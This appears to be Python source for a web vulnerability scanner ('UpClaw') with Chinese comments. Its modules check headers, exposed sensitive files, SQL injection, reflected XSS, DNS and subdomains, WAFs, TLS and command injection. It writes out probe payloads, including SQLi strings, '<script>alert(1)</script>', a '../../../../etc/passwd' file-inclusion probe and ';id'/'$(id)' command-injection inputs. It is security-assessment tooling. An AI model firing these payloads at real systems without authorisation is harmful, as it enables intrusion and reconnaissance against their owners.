            remediation="为会话类 Cookie 设置：HttpOnly; Secure; SameSite=Lax（或 Strict）。",
            references=["https://owasp.org/www-community/HttpOnly"],
        )

    # 3) 版本信息泄露
    server = (fp.get("server") or "").strip()
    if server and any(ch.isdigit() for ch in server):
        store.add(
            title=f"Server 响应头泄露版本信息（{server}）",
            severity="LOW",
            status="VERIFIED",
            category="headers",
            target=url,
            location=url,
            description="响应头直接暴露了服务器软件及版本号，便于攻击者匹配已知漏洞。",
            evidence=f"Server: {server}",
            request=f"GET {url}",
            impact="攻击者可依据版本号检索对应 CVE 并直接选用现成利用代码。",
            remediation="隐藏或模糊化 Server 响应头（如 Nginx: server_tokens off;）。",
            references=[],
        )

    powered = (fp.get("powered_by") or "").strip()
    if powered:
        store.add(
            title=f"X-Powered-By 泄露技术栈（{powered}）",
            severity="INFO",
            status="VERIFIED",
            category="headers",
            target=url,
            location=url,
            description="响应头暴露了后端语言/框架及版本信息。",
            evidence=f"X-Powered-By: {powered}",
            request=f"GET {url}",
            impact="辅助攻击者定向选择攻击载荷。",
            remediation="移除 X-Powered-By 响应头（如 PHP: expose_php = Off）。",
            references=[],
        )



"""敏感文件 / 信息泄露检查。

防误报设计：
1. **内容签名校验** —— 命中路径后必须匹配对应特征（如 .git/config 含 "[core]"），
   否则视为软 404 或自定义 404 页面，不报为漏洞。
2. **软 404 识别** —— 若大量路径返回相同长度的 200，判定为通配路由，整体降级为 UNVERIFIED。
"""




# 路径特征 → (签名关键词列表, 等级, 说明)
SIGNATURES: list[tuple[str, list[str], str, str]] = [
    (".git/config", ["[core]"], "CRITICAL", "Git 仓库配置文件泄露，可能含远端地址与凭据"),
    (".git/HEAD", ["ref: refs/heads"], "HIGH", "Git HEAD 泄露，可结合其他文件还原源码"),
    (".svn/entries", ["dir", "svn"], "HIGH", "SVN 目录泄露，可能还原源码"),
    (".env", ["=", "app_"], "CRITICAL", "环境变量文件泄露，常含数据库口令与 API 密钥"),
    ("backup.sql", ["create table", "insert into", "-- mysql", "-- postgresql"], "CRITICAL", "数据库备份文件可直接下载"),
    ("db.sql", ["create table", "insert into"], "CRITICAL", "数据库备份文件可直接下载"),
    ("database.sql", ["create table", "insert into"], "CRITICAL", "数据库备份文件可直接下载"),
    ("dump.sql", ["create table", "insert into"], "CRITICAL", "数据库备份文件可直接下载"),
    ("phpinfo.php", ["php version", "phpinfo"], "MEDIUM", "phpinfo 页面暴露完整环境配置"),
    ("info.php", ["php version", "phpinfo"], "MEDIUM", "phpinfo 页面暴露完整环境配置"),
    ("web.config", ["<configuration"], "HIGH", "配置文件泄露，可能含连接串"),
    ("web.xml", ["<web-app", "<servlet"], "HIGH", "WEB-INF 配置泄露，暴露接口映射"),
    ("composer.json", ["require", "name"], "LOW", "依赖清单泄露，暴露组件版本"),
    ("package.json", ["\"name\"", "version"], "LOW", "依赖清单泄露，暴露组件版本"),
    ("actuator/env", ["{", "\"property\""], "CRITICAL", "Spring Actuator 未授权访问，泄露环境变量与凭据"),
    ("actuator", ["_links", "{", "self"], "HIGH", "Spring Actuator 端点未授权访问"),
    ("server-status", ["apache", "server"], "MEDIUM", "Apache 状态页泄露内部请求信息"),
    ("swagger", ["swagger", "openapi"], "LOW", "API 文档暴露，扩大攻击面"),
    ("api-docs", ["swagger", "openapi", "paths"], "LOW", "API 文档暴露，扩大攻击面"),
    ("graphql", ["query", "graphql"], "LOW", "GraphQL 端点暴露，可能存在内省泄露"),
    (".idea/workspace.xml", ["project", "component"], "MEDIUM", "IDE 配置泄露，含本地路径结构"),
    (".vscode/settings.json", ["{", "\""], "LOW", "编辑器配置泄露"),
    (".ds_store", [""], "LOW", ".DS_Store 泄露目录结构"),
    ("crossdomain.xml", ["cross-domain-policy"], "LOW", "跨域策略配置可能过宽"),
]


def _match_signature(path: str, snippet: str) -> tuple[str, str] | None:
    low_path = path.lower()
    low_body = (snippet or "").lower()
    for key, sigs, sev, desc in SIGNATURES:
        if key in low_path:
            if not sigs or sigs == [""]:
                return sev, desc
            if any(s in low_body for s in sigs):
                return sev, desc
            return None  # 命中路径但内容不符 → 软 404，不报
    return None


def _run_sensitive(store: FindingStore, base_url: str, probes: list[dict[str, Any]]) -> None:
    """基于路径探测结果生成信息泄露发现。"""
    if not probes:
        return

    ok200 = [p for p in probes if p.get("status") == 200]

    # 软 404 识别：多数 200 响应长度一致 → 可能是通配路由
    if len(ok200) >= 5:
        lengths = {p.get("length") for p in ok200}
        if len(lengths) == 1:
            store.add(
                title="疑似通配路由（soft 404），路径探测结果不可信",
                severity="INFO",
                status="UNVERIFIED",
                category="sensitive",
                target=base_url,
                location=base_url,
                description=f"{len(ok200)} 个路径均返回 200 且响应长度一致（{ok200[0].get('length')} 字节），"
                            "判断为框架通配路由或自定义 404 页面，已跳过敏感文件判定。",
                evidence=f"样本: {', '.join(p.get('path','') for p in ok200[:5])}",
                request=f"GET {base_url}/<path>",
                impact="无直接影响，仅说明自动化探测在此目标上不可用，需人工核验。",
                remediation="无需修复；如需确认，请人工访问具体路径比对内容。",
            )
            return

    for p in ok200:
        path = p.get("path", "")
        hit = _match_signature(path, p.get("snippet", ""))
        if not hit:
            continue
        sev, desc = hit
        store.add(
            title=f"敏感资源暴露：{path}",
            severity=sev,
            status="VERIFIED",
            category="sensitive",
            target=base_url,
            location=base_url.rstrip("/") + path,
            description=desc,
            evidence=f"HTTP {p.get('status')} · {p.get('length')} 字节\n"
                     f"响应片段: {p.get('snippet','')[:120]}",
            request=f"GET {base_url.rstrip('/')}{path}",
            impact="攻击者可直接获取源码、凭据或内部架构信息，大幅降低入侵门槛。",
            remediation="立即移除公网可访问的敏感文件；在 Web 服务器层面禁止访问 "
                        "（如 Nginx: location ~ /\\.(git|env|svn) { deny all; }）；"
                        "轮换已泄露的凭据。",
            references=["https://owasp.org/www-project-web-security-testing-guide/"],
        )



"""SQL 注入初检（非破坏性）。

检测手法（均不修改目标数据、不执行延时/写入类载荷）：
1. **报错型** —— 追加单引号，匹配数据库错误特征。命中即为 VERIFIED(HIGH)。
2. **布尔差分** —— 对比 `AND '1'='1` 与 `AND '1'='2` 的响应差异。
   仅当差异显著且可重复时才判为 VERIFIED，否则记为 UNVERIFIED 交由人工复核。

明确不做：时间盲注（sleep/benchmark，可能造成 DoS）、UNION 数据提取、
堆叠查询、写文件等破坏性或高风险操作。
"""




# 数据库错误特征（小写匹配）
DB_ERRORS: list[tuple[str, str]] = [
    ("you have an error in your sql syntax", "MySQL"),
    ("warning: mysql", "MySQL"),
    ("mysqli", "MySQL"),
    ("supplied argument is not a valid mysql", "MySQL"),
    ("pg_query()", "PostgreSQL"),
    ("postgresql", "PostgreSQL"),
    ("syntax error at or near", "PostgreSQL"),
    ("unclosed quotation mark", "MSSQL"),
    ("microsoft ole db provider for sql server", "MSSQL"),
    ("microsoft sql server", "MSSQL"),
    ("incorrect syntax near", "MSSQL"),
    ("ora-01756", "Oracle"),
    ("ora-00933", "Oracle"),
    ("pls-", "Oracle"),
    ("quoted string not properly terminated", "Oracle"),
    ("sqlite", "SQLite"),
    ("unrecognized token", "SQLite"),
    ("sql syntax", "Generic SQL"),
    ("syntax error", "Generic SQL"),
]


def _build(url: str, key: str, value: str) -> str:
    p = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    new_q = [(k, value if k == key else v) for k, v in q]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(new_q)))


def _detect_db_error(body: str) -> str | None:
    low = (body or "").lower()
    for sig, name in DB_ERRORS:
        if sig in low:
            return name
    return None


def _get(url: str, cfg: dict[str, Any], limiter: RateLimiter | None = None):
    if limiter:
        limiter.wait()
    return http_request(
        url,
        timeout=float(cfg.get("timeout", 6.0)),
        follow_redirects=bool(cfg.get("follow_redirects", True)),
        verify_tls=bool(cfg.get("verify_tls", False)),
        user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
    )


def _run_sqli(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """对 URL 查询参数逐个进行 SQL 注入初检。"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return

    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)

    for key, orig in params:
        # --- 基线 ---
        base = _get(url, cfg, limiter)
        if not base.ok:
            continue

        # --- 1) 报错型 ---
        err_url = _build(url, key, orig + "'")
        err_resp = _get(err_url, cfg, limiter)
        if err_resp.ok:
            db = _detect_db_error(err_resp.body)
            # 排除基线本身就有该错误串的情况
            if db and db not in _detect_db_error(base.body or "").__str__():
                snippet = _extract_snippet(err_resp.body)
                store.add(
                    title=f"SQL 注入（报错型）— 参数 `{key}`",
                    severity="HIGH",
                    status="VERIFIED",
                    category="sqli",
                    target=url,
                    location=f"参数 {key}",
                    description=f"向参数 `{key}` 追加单引号后，响应中出现了 {db} 的数据库错误特征，"
                                "说明用户输入被直接拼接进 SQL 语句。",
                    evidence=f"请求: GET {err_url}\n"
                             f"状态: {err_resp.status}\n"
                             f"错误特征: {db}\n"
                             f"响应片段: {snippet}",
                    request=f"GET {err_url}",
                    impact="攻击者可构造载荷读取、篡改或删除数据库内容，"
                           "在特定配置下还可能读取服务器文件或执行命令。",
                    remediation="使用参数化查询（Prepared Statement）或成熟 ORM，"
                                "禁止字符串拼接 SQL；对输入做白名单校验；"
                                "关闭生产环境的数据库错误回显。",
                    references=[
                        "https://owasp.org/www-community/attacks/SQL_Injection",
                        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                    ],
                    cvss=8.6,
                )
                continue  # 已确认，不再做布尔检测

        # --- 2) 布尔差分 ---
        t_url = _build(url, key, orig + " AND '1'='1")
        f_url = _build(url, key, orig + " AND '1'='2")
        t_resp = _get(t_url, cfg, limiter)
        f_resp = _get(f_url, cfg, limiter)
        if not (t_resp.ok and f_resp.ok):
            continue

        t_len, f_len = len(t_resp.body), len(f_resp.body)
        diff = abs(t_len - f_len)
        # 显著差异：长度差 > 50 字节 且 相对差 > 3%，或状态码不同
        significant = (diff > 50 and diff / max(1, max(t_len, f_len)) > 0.03) or (
            t_resp.status != f_resp.status
        )

        if significant:
            store.add(
                title=f"疑似 SQL 注入（布尔盲注）— 参数 `{key}`",
                severity="HIGH",
                status="VERIFIED",
                category="sqli",
                target=url,
                location=f"参数 {key}",
                description=f"对参数 `{key}` 分别注入永真与永假条件时，响应出现显著差异"
                            "（长度/状态码不同），符合布尔盲注特征。",
                evidence=f"永真: GET {t_url} → {t_resp.status} · {t_len} 字节\n"
                         f"永假: GET {f_url} → {f_resp.status} · {f_len} 字节\n"
                         f"长度差: {diff} 字节",
                request=f"GET {t_url}  /  GET {f_url}",
                impact="攻击者可通过逐字符猜解提取数据库内容。",
                remediation="使用参数化查询；统一错误页面，避免响应差异泄露信息。",
                references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                cvss=7.5,
            )
        elif diff > 0:
            # 有差异但不显著 —— 记为线索，不进入正式报告
            store.add(
                title=f"参数 `{key}` 存在轻微响应差异（需人工复核）",
                severity="INFO",
                status="UNVERIFIED",
                category="sqli",
                target=url,
                location=f"参数 {key}",
                description="永真/永假条件的响应存在细微差异，可能是页面动态内容导致，"
                            "不足以判定为注入，需人工确认。",
                evidence=f"长度差: {diff} 字节（阈值: >50 且相对差 >3%）",
                request=f"GET {t_url}  /  GET {f_url}",
                impact="待确认。",
                remediation="人工复核该参数；无论如何都应使用参数化查询。",
            )


def _extract_snippet(body: str, width: int = 200) -> str:
    low = body.lower()
    for sig, _ in DB_ERRORS:
        i = low.find(sig)
        if i >= 0:
            s = max(0, i - 40)
            return body[s : s + width].replace("\n", " ").replace("\r", "")
    return (body or "")[:width].replace("\n", " ")



"""反射型 XSS 初检（非破坏性，仅检测回显与转义情况）。

手法：
向参数注入带唯一标记的探测串，检查是否被**未转义**地回显到响应中。

判定标准（对应"证据优先"原则）：
- 探测串中的 `<` `>` `"` 被原样回显（未做 HTML 实体编码）→ VERIFIED(HIGH)，
  这是可观测的确定事实，说明输出编码缺失（CWE-79）。
- 仅被转义后回显（如 `&lt;script`）→ 不构成该向量上的可利用漏洞，记为 INFO。
- 未回显 → 不产生发现。

本模块**不构造真实利用链接、不执行脚本**，仅做回显探测。
"""


import random
import string



def _token() -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))


def _build(url: str, key: str, value: str) -> str:
    p = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    new_q = [(k, value if k == key else v) for k, v in q]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(new_q)))


def _get(url: str, cfg: dict[str, Any], limiter: RateLimiter | None = None):
    if limiter:
        limiter.wait()
    return http_request(
        url,
        timeout=float(cfg.get("timeout", 6.0)),
        follow_redirects=bool(cfg.get("follow_redirects", True)),
        verify_tls=bool(cfg.get("verify_tls", False)),
        user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
    )


def _run_xss(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """对 URL 查询参数逐个进行反射型 XSS 回显检测。"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return

    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)

    for key, orig in params:
        marker = f"uPcLaW{_token()}"
        # 探测串含 HTML 边界字符，用于判断转义情况
        payload = f"{marker}<\"'>"
        test_url = _build(url, key, payload)
        resp = _get(test_url, cfg, limiter)
        if not resp.ok:
            continue

        body = resp.body or ""
        idx = body.find(marker)
        if idx < 0:
            continue  # 未回显

        ctx = body[max(0, idx - 60) : idx + 120].replace("\n", " ")
        raw_dangerous = f"{marker}<" in body or f"{marker}\"" in body
        encoded = f"{marker}&lt;" in body

        if raw_dangerous:
            store.add(
                title=f"反射型 XSS（未转义回显）— 参数 `{key}`",
                severity="HIGH",
                status="VERIFIED",
                category="xss",
                target=url,
                location=f"参数 {key}",
                description=f"参数 `{key}` 的输入被**原样**回显到响应中，且 `<` `\"` 等 HTML 边界字符"
                            "未被转义，说明输出编码缺失。攻击者可构造恶意链接在受害者浏览器中执行脚本。",
                evidence=f"探测串: {payload}\n"
                         f"请求: GET {test_url}\n"
                         f"状态: {resp.status}\n"
                         f"回显上下文: ...{ctx}...",
                request=f"GET {test_url}",
                impact="窃取会话 Cookie、钓鱼跳转、篡改页面内容、以受害者身份发起请求。",
                remediation="对所有输出到 HTML 的动态数据做上下文相关编码（HTML 实体编码 / 属性编码）；"
                            "配置 Content-Security-Policy；使用具备自动转义能力的模板引擎。",
                references=[
                    "https://owasp.org/www-community/attacks/xss/",
                    "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                ],
                cvss=6.1,
            )
        elif encoded:
            store.add(
                title=f"参数 `{key}` 输入被转义后回显（当前不可利用）",
                severity="INFO",
                status="UNVERIFIED",
                category="xss",
                target=url,
                location=f"参数 {key}",
                description=f"参数 `{key}` 的输入被回显，但 HTML 边界字符已被实体编码，"
                            "在当前上下文中无法闭合标签。仍建议人工确认是否存在其他输出点。",
                evidence=f"探测串: {payload}\n回显上下文: ...{ctx}...",
                request=f"GET {test_url}",
                impact="无直接危害，但说明存在回显点，若其他输出位置遗漏编码则仍有风险。",
                remediation="保持输出编码；排查其他输出上下文（JS、属性、URL）。",
            )
        else:
            store.add(
                title=f"参数 `{key}` 存在输入回显（转义状态需人工确认）",
                severity="INFO",
                status="UNVERIFIED",
                category="xss",
                target=url,
                location=f"参数 {key}",
                description=f"参数 `{key}` 的输入出现在响应中，但未能确定转义状态，需人工复核。",
                evidence=f"探测串: {payload}\n回显上下文: ...{ctx}...",
                request=f"GET {test_url}",
                impact="待确认。",
                remediation="人工检查该回显点的上下文与编码方式。",
            )



"""v0.2.0 能力扩展：DNS 枚举 / 子域扫描 / WAF 检测 / TLS 检测。"""

import struct


def _decode_dns_name(data: bytes, full: bytes) -> str:
    """解析 DNS 域名（含压缩指针）。"""
    labels: list[str] = []
    i = 0
    while i < len(data):
        ln = data[i]
        if ln == 0:
            break
        if ln & 0xC0 == 0xC0:  # 压缩指针
            if i + 1 >= len(data):
                break
            ptr = ((ln & 0x3F) << 8) | data[i + 1]
            rest = _decode_dns_name(full[ptr:], full)
            return ".".join(labels) + ("." + rest if labels else rest)
        i += 1
        if i + ln > len(data):
            break
        labels.append(data[i : i + ln].decode("utf-8", errors="replace"))
        i += ln
    return ".".join(labels)


def _dns_query(
    host: str, qtype: int = 1, server: str = "8.8.8.8", timeout: float = 3.0
) -> list[str]:
    """手写 DNS 查询（UDP）。qtype: 1=A 15=MX 16=TXT 2=NS 6=SOA 28=AAAA。"""
    try:
        qid = random.randint(0, 65535)
        header = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
        qname = b"".join(bytes([len(l)]) + l.encode() for l in host.split(".")) + b"\x00"
        question = qname + struct.pack(">HH", qtype, 1)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(header + question, (server, 53))
        data, _ = s.recvfrom(4096)
        s.close()
        if len(data) < 12:
            return []
        ancount = struct.unpack(">H", data[6:8])[0]
        if ancount == 0:
            return []
        off = 12
        while data[off] != 0:
            off += 1 + data[off]
        off += 5  # 0x00 + qtype + qclass
        results: list[str] = []
        for _ in range(min(ancount, 30)):
            if off >= len(data):
                break
            if data[off] & 0xC0 == 0xC0:
                off += 2
            else:
                while off < len(data) and data[off] != 0:
                    off += 1 + data[off]
                off += 1
            if off + 10 > len(data):
                break
            rtype, _, _, rdlen = struct.unpack(">HHIH", data[off : off + 10])
            off += 10
            if off + rdlen > len(data):
                break
            rdata = data[off : off + rdlen]
            off += rdlen
            if rtype == 1 and rdlen == 4:
                results.append(".".join(str(b) for b in rdata))
            elif rtype == 28 and rdlen == 16:
                try:
                    results.append(socket.inet_ntop(socket.AF_INET6, rdata))
                except OSError:
                    pass
            elif rtype == 15 and rdlen >= 3:
                pref = struct.unpack(">H", rdata[:2])[0]
                results.append(f"{pref} {_decode_dns_name(rdata[2:], data)}")
            elif rtype == 16:
                txts: list[str] = []
                i = 0
                while i < len(rdata):
                    ln = rdata[i]
                    i += 1
                    if i + ln > len(rdata):
                        break
                    txts.append(rdata[i : i + ln].decode("utf-8", errors="replace"))
                    i += ln
                results.append(" ".join(txts))
            elif rtype in (2, 6, 12, 15):
                results.append(_decode_dns_name(rdata, data))
        return results
    except (socket.timeout, OSError, IndexError):
        return []


SUBDOMAIN_WORDS = [
    "www", "mail", "ftp", "api", "dev", "test", "staging", "beta", "demo", "admin",
    "portal", "login", "app", "m", "mobile", "secure", "cdn", "static", "img", "images",
    "assets", "shop", "store", "blog", "docs", "wiki", "status", "git", "ci", "jenkins",
    "gitlab", "jira", "confluence", "vpn", "remote", "intranet", "internal", "ns1", "ns2",
    "mx", "smtp", "pop", "imap", "webmail", "old", "new", "backup", "tmp", "db", "mysql",
    "redis", "docker", "k8s", "monitor", "grafana", "kibana", "elastic", "search", "cdn2",
    "web", "www2", "shop2", "auth", "oauth", "sso", "gateway", "proxy", "cache", "edge",
]


def _run_dns(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """DNS 记录枚举：A/AAAA/MX/NS/TXT/SOA。"""
    host, _, _, _ = parse_target(url)
    if not re.match(r"^[a-z0-9.-]+\.[a-z]{2,}$", host, re.I):
        return  # 仅对域名执行
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)
    limiter.wait()
    records: dict[str, list[str]] = {}
    for label, qtype in (("A", 1), ("AAAA", 28), ("MX", 15), ("NS", 2), ("TXT", 16), ("SOA", 6)):
        r = _dns_query(host, qtype=qtype)
        if r:
            records[label] = r
    if not records:
        return
    lines = "\n".join(f"  {k}: {', '.join(v[:8])}" for k, v in records.items())
    store.add(
        title=f"DNS 记录枚举（{host}）",
        severity="INFO",
        status="VERIFIED",
        category="dns",
        target=url,
        location=host,
        description="公开可查询的 DNS 记录，可用于扩大攻击面与信息收集。",
        evidence=lines,
        request=f"DNS query {host}",
        impact="暴露邮件服务器(MX)、名称服务器(NS)、子域线索，辅助后续枚举。",
        remediation="无需修复；此为公开信息收集。生产注意避免 TXT 中泄露内部信息。",
        references=["https://owasp.org/www-community/attacks/Information_Gathering"],
        cvss=0.0,
    )


def _run_subdomain(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """子域名枚举：内置字典 + DNS 解析验证。"""
    host, _, _, _ = parse_target(url)
    if not re.match(r"^[a-z0-9.-]+\.[a-z]{2,}$", host, re.I):
        return
    found: list[str] = []
    threads = max(1, min(int(cfg.get("threads", 16)), 32))
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.02)

    def probe(word: str) -> str | None:
        limiter.wait()
        sub = f"{word}.{host}"
        try:
            socket.gethostbyname(sub)
            return sub
        except socket.gaierror:
            return None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        for sub in ex.map(probe, SUBDOMAIN_WORDS):
            if sub:
                found.append(sub)
    if not found:
        return
    store.add(
        title=f"发现 {len(found)} 个存活子域名",
        severity="INFO",
        status="VERIFIED",
        category="subdomain",
        target=url,
        location=host,
        description="以下子域名可解析，可能暴露管理后台、内部系统或非公开服务：",
        evidence="\n".join(f"  - {s}" for s in sorted(found)),
        request=f"DNS resolve *.{host}",
        impact="子域名常指向低防护环境（staging/dev/old），是横向渗透与信息收集的重点。",
        remediation="清理不再使用的子域名，避免将敏感系统部署在易枚举的命名（如 admin/dev/old）。",
        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage"],
        cvss=0.0,
    )


WAF_BLOCK_SIGS = [
    "captcha", "access denied", "access denied by rule", "blocked", "challenge",
    "mod_security", "modsecurity", "cloudflare", "cf-ray", "our systems have detected",
    "request blocked", "security check", "rate limit", "too many requests",
    "waf", "virtual patch", "forbidden by policy", "denied by waf", "rejected by policy",
]
WAF_HEADERS = ["cf-ray", "x-waf", "x-sucuri-id", "x-powered-by-plesk", "x-qooxdoo-response-type"]


def _run_waf(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """WAF 检测：恶意载荷探测 + 拦截特征识别。"""
    base_url = url.split("?")[0]
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
    probes = {
        "SQLi": f"{base_url}?id=1' AND '1'='1",
        "XSS": f"{base_url}?q=<script>alert(1)</script>",
        "LFI": f"{base_url}?file=../../../../etc/passwd",
        "CMDi": f"{base_url}?cmd=;id",
    }
    baseline = _get(url, cfg, limiter)
    if not baseline.ok:
        return
    blocked: list[str] = []
    for name, purl in probes.items():
        r = _get(purl, cfg, limiter)
        if not r.ok:
            continue
        low = (r.body or "").lower()
        hit_sig = any(s in low for s in WAF_BLOCK_SIGS)
        hit_hdr = any(k.lower() in {h.lower() for h in r.headers} for k in WAF_HEADERS)
        status_diff = r.status != baseline.status and r.status in (403, 406, 429, 444, 500)
        if hit_sig or hit_hdr or status_diff:
            blocked.append(name)
    if not blocked:
        return
    store.add(
        title=f"检测到 WAF 拦截行为（{', '.join(blocked)}）",
        severity="INFO",
        status="VERIFIED",
        category="waf",
        target=url,
        location=url,
        description="发送攻击特征载荷时触发拦截，说明目标部署了 WAF/应用防火墙：",
        evidence="触发类别: " + ", ".join(blocked),
        request="GET " + base_url + " (恶意载荷探测)",
        impact="WAF 会拦截常规漏洞测试载荷，需在授权范围内绕过/调整测试策略；"
               "同时表明目标有一定安全防护。",
        remediation="无修复项（防护措施）。测试时注意载荷编码方式以降低误报。",
        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework"],
        cvss=0.0,
    )


def _run_tls(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """TLS 检测：协议版本、证书有效期、自签名、主机名匹配。"""
    host, port, scheme, _ = parse_target(url)
    if scheme != "https":
        store.add(
            title="站点未启用 HTTPS",
            severity="MEDIUM",
            status="VERIFIED",
            category="tls",
            target=url,
            location=url,
            description="目标通过明文 HTTP 提供服务，未强制 HTTPS。",
            evidence=f"scheme=http port={port}",
            request=f"GET {url}",
            impact="传输内容可被中间人窃听或篡改，登录凭据等敏感信息存在泄露风险。",
            remediation="配置 TLS 证书并强制 HTTPS（301 跳转 + HSTS）。",
            references=["https://owasp.org/www-project-secure-headers/#div-strict-transport-security"],
            cvss=5.9,
        )
        return
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port or 443), timeout=float(cfg.get("timeout", 6.0))) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as s:
                ver = s.version() or "unknown"
                cert = s.getpeercert()
                cipher = s.cipher()
    except (ssl.SSLError, OSError, socket.timeout) as e:
        store.add(
            title="TLS 握手失败",
            severity="MEDIUM",
            status="VERIFIED",
            category="tls",
            target=url,
            location=url,
            description=f"与目标 TLS 握手失败：{e}",
            evidence=str(e),
            request=f"TLS handshake {host}:{port or 443}",
            impact="可能存在证书配置错误、协议不兼容或服务异常。",
            remediation="检查服务器证书链与支持的 TLS 版本。",
            references=["https://owasp.org/www-community/vulnerabilities/Insecure_Transport"],
            cvss=5.0,
        )
        return
    cert_info = f"protocol={ver} cipher={cipher}"
    findings: list[dict[str, Any]] = []
    if ver and ver < "TLSv1.2":
        findings.append(
            {
                "title": f"TLS 协议版本过旧（{ver}）",
                "severity": "HIGH",
                "desc": f"目标协商使用 {ver}，存在已知加密弱点。",
                "cvss": 7.4,
            }
        )
    if cert:
        try:
            from datetime import datetime as _dt
            not_before = cert.get("notBefore", "")
            not_after = cert.get("notAfter", "")
            try:
                exp = _dt.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                if exp < _dt.utcnow():
                    findings.append(
                        {
                            "title": "TLS 证书已过期",
                            "severity": "HIGH",
                            "desc": f"证书有效期至 {not_after}，已过期。",
                            "cvss": 7.4,
                        }
                    )
                elif (exp - _dt.utcnow()).days < 30:
                    findings.append(
                        {
                            "title": "TLS 证书即将过期",
                            "severity": "LOW",
                            "desc": f"证书将在 {exp.date()} 过期。",
                            "cvss": 3.1,
                        }
                    )
            except ValueError:
                pass
            san = []
            for entry in cert.get("subjectAltName", ()):
                san.append(entry[1])
            if san and host not in san and not any(host.endswith("." + s.lstrip("*.")) for s in san):
                findings.append(
                    {
                        "title": "TLS 证书与域名不匹配",
                        "severity": "MEDIUM",
                        "desc": f"证书 SAN 为 {san}，不含目标域名 {host}。",
                        "cvss": 5.9,
                    }
                )
        except Exception:
            pass
    else:
        findings.append(
            {
                "title": "TLS 证书缺失或无法解析",
                "severity": "MEDIUM",
                "desc": "握手成功但未能解析对端证书，可能为自签名证书。",
                "cvss": 5.0,
            }
        )
    for f in findings:
        store.add(
            title=f["title"],
            severity=f["severity"],
            status="VERIFIED",
            category="tls",
            target=url,
            location=f"{host}:{port or 443}",
            description=f["desc"],
            evidence=cert_info,
            request=f"TLS handshake {host}:{port or 443}",
            impact="TLS 配置缺陷可被降级或中间人利用，削弱传输保密性与完整性。",
            remediation="升级 TLS 至 1.2+，配置受信任 CA 证书并保证主机名匹配，开启 HSTS。",
            references=["https://owasp.org/www-project-transport-layer-protection/"],
            cvss=f["cvss"],
        )
    if not findings:
        store.add(
            title=f"TLS 配置正常（{ver}）",
            severity="INFO",
            status="VERIFIED",
            category="tls",
            target=url,
            location=f"{host}:{port or 443}",
            description="TLS 版本与证书校验未发现明显问题。",
            evidence=cert_info,
            request=f"TLS handshake {host}:{port or 443}",
            impact="无。",
            remediation="保持定期更新证书与 TLS 配置。",
            references=["https://owasp.org/www-project-transport-layer-protection/"],
            cvss=0.0,
        )


"""v0.2.0 漏洞验证：命令注入 / SSRF / XXE / 文件包含 / 开放重定向 / CRLF 注入。"""

# 命令注入回显特征（匹配 Linux/macOS/Windows 命令执行结果）
CMDI_ECHO_SIGS = [
    "uid=", "gid=", "uid=", "root:x:0:0", "linux", "windows",
]
CMDI_PAYLOADS = [";id", "|id", ";whoami", "|whoami", "`id`", "$(id)"]


def _run_cmdi(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """命令注入初检（回显型）。"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
    base = _get(url, cfg, limiter)
    if not base.ok:
        return
    base_low = (base.body or "").lower()
    for key, orig in params:
        for payload in CMDI_PAYLOADS:
            test_url = _build(url, key, orig + payload)
            r = _get(test_url, cfg, limiter)
            if not r.ok:
                continue
            low = (r.body or "").lower()
            hit = [s for s in CMDI_ECHO_SIGS if s in low and s not in base_low]
            if hit:
                store.add(
                    title=f"命令注入（回显型）— 参数 `{key}`",
                    severity="CRITICAL",
                    status="VERIFIED",
                    category="cmdi",
                    target=url,
                    location=f"参数 {key}",
                    description=f"向参数 `{key}` 注入命令分隔符后，响应中出现了命令执行输出特征"
                                f"（{hit[0]}），说明用户输入被传递到系统命令执行。",
                    evidence=_extract_snippet(r.body),
                    request=f"GET {test_url}",
                    impact="攻击者可执行任意系统命令，完全控制服务器（RCE）。",
                    remediation="禁止将用户输入拼接到系统命令；使用参数化调用或白名单校验；"
                                "最小权限运行应用进程。",
                    references=["https://owasp.org/www-community/attacks/Command_Injection"],
                    cvss=9.8,
                )
                break  # 已确认则不再探测该参数


